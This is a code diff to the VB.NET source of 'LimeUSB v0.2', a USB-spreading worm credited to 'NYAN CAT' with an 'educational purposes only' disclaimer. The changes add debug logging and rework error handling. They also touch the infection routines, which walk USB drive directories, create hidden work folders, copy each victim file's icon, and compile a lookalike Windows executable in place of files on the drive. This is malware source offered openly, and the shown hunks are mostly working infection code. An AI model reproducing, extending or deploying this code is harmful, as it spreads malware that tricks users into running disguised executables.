@@ -1,6 +1,14 @@
 ﻿Imports System.IO
 Imports System.Drawing.IconLib
 
+'
+'       │ Author     : NYAN CAT
+'       │ Name       : LimeUSB v0.2
+
+'       Contact Me   : https://github.com/NYAN-x-CAT
+'       This program Is distributed for educational purposes only.
+'
+
 Module Program
 
     Public Sub Main()
@@ -39,6 +47,7 @@ Module Program
 
                 End If
             Catch ex As Exception
+                Debug.WriteLine("Initialize " + ex.Message)
             End Try
         Next
     End Sub
@@ -62,6 +71,7 @@ Module Program
                     CompileFile(File)
                 End If
             Catch ex As Exception
+                Debug.WriteLine("InfectFiles " + ex.Message)
             End Try
         Next
 
@@ -70,23 +80,21 @@ Module Program
                 InfectFiles(Directory)
             End If
         Next
-
     End Sub
 
-    Public Function CreteDirectory(USB_Directory As String)
-        Try
-            For Each Directory In IO.Directory.GetDirectories(USB_Directory)
+    Public Sub CreteDirectory(USB_Directory As String)
+        For Each Directory In IO.Directory.GetDirectories(USB_Directory)
+            Try
                 If Not Directory.Contains(Settings.WorkDirectory) Then
                     If Not IO.Directory.Exists(Directory.Insert(3, Settings.WorkDirectory + "\")) Then
                         IO.Directory.CreateDirectory(Directory.Insert(3, Settings.WorkDirectory + "\"))
                     End If
                     CreteDirectory(Directory)
                 End If
-            Next
-        Catch ex As Exception
-        End Try
-        Return False
-    End Function
+            Catch ex As Exception
+            End Try
+        Next
+    End Sub
 
     Public Function CheckIfInfected(File As String)
         Try
@@ -107,7 +115,7 @@ Module Program
             Dim MultiIcon As New MultiIcon()
             Dim SingleIcon As SingleIcon = MultiIcon.Add(Path.GetFileName(File))
             SingleIcon.CreateFrom(FileIcon.ToBitmap(), IconOutputFormat.Vista)
-            SingleIcon.Save(Path.GetPathRoot(File) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(File) & ".ico")
+            SingleIcon.Save(Path.GetPathRoot(File) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(File.Replace(" ", Nothing)) + ".ico")
         Catch ex As Exception
         End Try
     End Sub
@@ -127,8 +135,8 @@ Module Program
             Dim CodeProvider As New VBCodeProvider(providerOptions)
             Dim Parameters As New CodeDom.Compiler.CompilerParameters
             Dim OP As String = " /target:winexe /platform:x86 /optimize+ /nowarn"
-            If File.Exists(Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile) & ".ico") Then
-                OP += " /win32icon:" + Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile) & ".ico"
+            If File.Exists(Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", Nothing)) + ".ico") Then
+                OP += " /win32icon:" + Path.GetPathRoot(InfectedFile) + Settings.WorkDirectory + "\" + Settings.IconsDirectory + "\" + Path.GetFileNameWithoutExtension(InfectedFile.Replace(" ", Nothing)) + ".ico"
             End If
             With Parameters
                 .GenerateExecutable = True
@@ -136,7 +144,6 @@ Module Program
                 .CompilerOptions = OP
                 .IncludeDebugInformation = False
                 .ReferencedAssemblies.Add("System.dll")
-
                 Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
                 For Each uii As CodeDom.Compiler.CompilerError In Results.Errors
                     Debug.WriteLine(uii.ToString)
@@ -144,18 +151,17 @@ Module Program
                 Next
             End With
         Catch ex As Exception
+            Debug.WriteLine("CompileFile " + ex.Message)
         End Try
     End Sub
 
     Public Function GetOS() As String
-        Try
-            Dim OS = New Devices.ComputerInfo()
-            If OS.OSFullName.Contains("7") Then
-                Return "v2.0"
-            End If
-        Catch ex As Exception
-        End Try
-        Return "v4.0"
+        Dim OS = New Devices.ComputerInfo()
+        If OS.OSFullName.Contains("7") Then
+            Return "v2.0"
+        Else
+            Return "v4.0"
+        End If
     End Function
 
     Public Function Randomz(ByVal L As Integer)
